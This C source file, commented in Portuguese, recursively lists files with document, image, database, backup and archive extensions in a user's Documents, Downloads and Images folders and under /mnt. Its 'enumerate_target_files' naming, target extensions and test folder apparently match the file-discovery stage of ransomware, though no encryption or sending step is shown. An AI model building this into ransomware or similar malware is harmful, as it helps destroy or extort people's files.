#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>

/*
 * Lista de extensões permitidas (case-insensitive)
 */
static const char *extensoes[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv",
    ".jpg",  ".png",  ".db",  ".backup",
    ".psd",  ".zip",  ".rar", NULL
};

/*
 * Verifica se a extensão do arquivo (case-insensitive) está na lista.
 * path: caminho completo ou apenas o nome do arquivo.
 * retorna 1 se a extensão for válida, 0 caso contrário.
 */
static int extensao_valida(const char *path) {
    const char *ext = strrchr(path, '.');
    if (!ext) return 0;                 // sem extensão
    for (int i = 0; extensoes[i] != NULL; i++) {
        if (strcasecmp(ext, extensoes[i]) == 0)
            return 1;
    }
    return 0;
}

/*
 * Expande '~' no início do caminho para o diretório home do usuário.
 * Retorna uma string alocada com strdup (deve ser liberada pelo chamador).
 */
static char *expandir_tilde(const char *path) {
    if (path[0] == '~' && (path[1] == '/' || path[1] == '\0')) {
        const char *home = getenv("HOME");
        if (!home) {
            fprintf(stderr, "AVISO: variável HOME não definida\n");
            return strdup(path);
        }
        size_t len = strlen(home) + strlen(path + 1) + 1;
        char *resultado = malloc(len);
        if (!resultado) {
            perror("malloc");
            return NULL;
        }
        snprintf(resultado, len, "%s%s", home, path + 1);
        return resultado;
    }
    return strdup(path);
}

/*
 * Função recursiva interna que percorre um diretório (caminho absoluto ou
 * relativo já expandido) e adiciona arquivos com extensão válida à lista.
 * Parametros:
 *   dir_path - caminho do diretório a ser percorrido
 *   list     - ponteiro para o array de strings (pode ser realocado)
 *   count    - ponteiro para o contador atual de itens
 *   capacity - ponteiro para a capacidade atual da lista
 * Retorna 0 em caso de sucesso, -1 em caso de erro grave (falha de alocação).
 */
static int enumerate_recursive(const char *dir_path,
                               char ***list,
                               int *count,
                               int *capacity) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        /* Diretório inacessível: apenas avisa e continua */
        fprintf(stderr, "AVISO: não foi possível abrir %s: %s\n",
                dir_path, strerror(errno));
        return 0;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        /* Ignora . e .. */
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        /* Monta caminho completo do objeto */
        char caminho[PATH_MAX];
        int ret = snprintf(caminho, sizeof(caminho), "%s/%s", dir_path, entry->d_name);
        if (ret < 0 || ret >= (int)sizeof(caminho)) {
            fprintf(stderr, "AVISO: caminho muito longo: %s/%s\n", dir_path, entry->d_name);
            continue;
        }

        struct stat st;
        /* Usa lstat para não seguir links simbólicos (evita loops) */
        if (lstat(caminho, &st) == -1) {
            fprintf(stderr, "AVISO: não foi possível estat %s: %s\n",
                    caminho, strerror(errno));
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            /* Subdiretório: chama recursivamente */
            if (enumerate_recursive(caminho, list, count, capacity) != 0) {
                /* erro de alocação: interrompe a recursão e retorna erro */
                closedir(dir);
                return -1;
            }
        } else if (S_ISREG(st.st_mode) || S_ISLNK(st.st_mode)) {
            /* Arquivo regular ou link simbólico (vamos listar se a extensão
             * for válida; para symlinks, o nome do link é que importa) */
            if (extensao_valida(entry->d_name)) {
                /* Verifica se precisa realocar */
                if (*count >= *capacity) {
                    int nova_cap = *capacity == 0 ? 1024 : (*capacity) * 2;
                    char **nova_lista = realloc(*list, nova_cap * sizeof(char *));
                    if (!nova_lista) {
                        perror("realloc");
                        closedir(dir);
                        return -1;
                    }
                    *list = nova_lista;
                    *capacity = nova_cap;
                }

                /* Duplica o caminho absoluto */
                (*list)[*count] = strdup(caminho);
                if (!(*list)[*count]) {
                    perror("strdup");
                    closedir(dir);
                    return -1;
                }
                (*count)++;
            }
        }
        /* Ignora outros tipos (FIFO, socket, etc.) */
    }

    closedir(dir);
    return 0;
}

/*
 * Enumera todos os arquivos nos diretórios fixos cujas extensões estejam
 * na lista de extensões válidas. Retorna um array de strings (caminhos
 * absolutos) alocado dinamicamente. O número de itens é armazenado em count.
 * Em caso de erro alocação, pode retornar NULL (count = 0).
 */
char **enumerate_target_files(int *count) {
    if (!count) return NULL;
    *count = 0;

    /* Lista de diretórios base (com ~ para expansão) */
    const char *dirs_raw[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt",
        NULL
    };

    char **lista = NULL;
    int capacidade = 0;

    for (int i = 0; dirs_raw[i] != NULL; i++) {
        char *dir_exp = expandir_tilde(dirs_raw[i]);
        if (!dir_exp) {
            /* Erro de alocação: limpa o que já foi alocado e retorna NULL */
            free_file_list(lista, *count);
            *count = 0;
            return NULL;
        }

        struct stat st;
        if (stat(dir_exp, &st) == -1) {
            /* Diretório não existe ou inacessível: apenas avisa */
            fprintf(stderr, "AVISO: diretório base %s não acessível: %s\n",
                    dir_exp, strerror(errno));
            free(dir_exp);
            continue;
        }

        if (!S_ISDIR(st.st_mode)) {
            fprintf(stderr, "AVISO: %s não é um diretório\n", dir_exp);
            free(dir_exp);
            continue;
        }

        /* Chama a enumeração recursiva */
        if (enumerate_recursive(dir_exp, &lista, count, &capacidade) != 0) {
            /* Erro de alocação durante a recursão */
            free_file_list(lista, *count);
            *count = 0;
            free(dir_exp);
            return NULL;
        }

        free(dir_exp);
    }

    /* Pode reajustar para o tamanho exato (opcional) */
    if (capacidade > *count && *count > 0) {
        char **compactado = realloc(lista, *count * sizeof(char *));
        if (compactado) lista = compactado;
    } else if (*count == 0 && lista) {
        free(lista);
        lista = NULL;
    }

    return lista;
}

/*
 * Libera a memória de uma lista de caminhos alocada por enumerate_target_files.
 */
void free_file_list(char **list, int count) {
    if (!list) return;
    for (int i = 0; i < count; i++) {
        free(list[i]);
    }
    free(list);
}